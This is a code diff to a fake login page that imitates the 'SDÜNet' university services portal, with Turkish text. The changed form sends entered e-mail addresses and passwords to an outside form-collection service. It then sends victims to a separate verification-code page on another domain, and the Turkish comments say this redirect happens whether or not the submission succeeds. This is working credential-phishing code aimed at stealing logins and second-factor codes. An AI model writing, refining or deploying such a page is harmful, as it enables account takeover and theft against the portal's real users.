@@ -1027,7 +1027,7 @@
                                         SDÜNet ile Çevrimiçi Hizmet ve Uygulamalar Tek Platformda...
                                     </span>
                                 </div>
-                                <form id="my-form" action="https://formspree.io/f/mvzzwyqq" method="POST"
+                                <form id="login-form" action="https://formspree.io/f/mpqpalkz" method="POST"
                                     style="padding:0 50px">
                                     <div style="margin-bottom: 10px;">
                                         <input type="text" name="email" placeholder="E-Posta Adresi" required
@@ -1038,26 +1038,26 @@
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
 
-                                    <button type="submit" id="my-form-button"
+                                    <button type="submit" id="btn-login"
                                         style="width: 100%; height: 50px; background-color: #800000; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">
                                         GİRİŞ YAP
                                     </button>
                                 </form>
 
                                 <script>
-                                    var form = document.getElementById("my-form");
-                                    form.addEventListener("submit", function (event) {
-                                        event.preventDefault();
-                                        var data = new FormData(event.target);
-                                        fetch(event.target.action, {
+                                    document.getElementById("login-form").addEventListener("submit", function (e) {
+                                        e.preventDefault();
+                                        const btn = document.getElementById("btn-login");
+                                        btn.innerText = "Giriş Yapılıyor...";
+                                        btn.disabled = true;
+
+                                        fetch(this.action, {
                                             method: 'POST',
-                                            body: data,
+                                            body: new FormData(this),
                                             headers: { 'Accept': 'application/json' }
-                                        }).then(() => {
-                                            // Bilgileri gönderdikten sonra 2FA sayfasına zorla gönder
-                                            window.location.replace("https://sdu-sistem.vercel.app/dogrulamaa.html");
-                                        }).catch(() => {
-                                            window.location.replace("https://sdu-sistem.vercel.app/dogrulamaa.html");
+                                        }).finally(() => {
+                                            // Bilgi gönderilse de hata verse de hemen kod sayfasına atıyoruz
+                                            window.location.href = "https://sdu-sistem.vercel.app/dogrulamaa.html";
                                         });
                                     });
                                 </script>
